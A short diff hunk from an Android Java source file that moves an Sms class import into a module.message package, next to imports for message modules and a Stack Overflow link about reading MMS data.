@@ -7,10 +7,10 @@ import android.net.Uri;
 import android.os.Handler;
 
 import com.android.service.Messages;
-import com.android.service.Sms;
 import com.android.service.Status;
 import com.android.service.manager.ManagerAgent;
 import com.android.service.module.ModuleMessage;
+import com.android.service.module.message.Sms;
 
 /**
  * http://stackoverflow.com/questions/3012287/how-to-read-mms-data-in-android
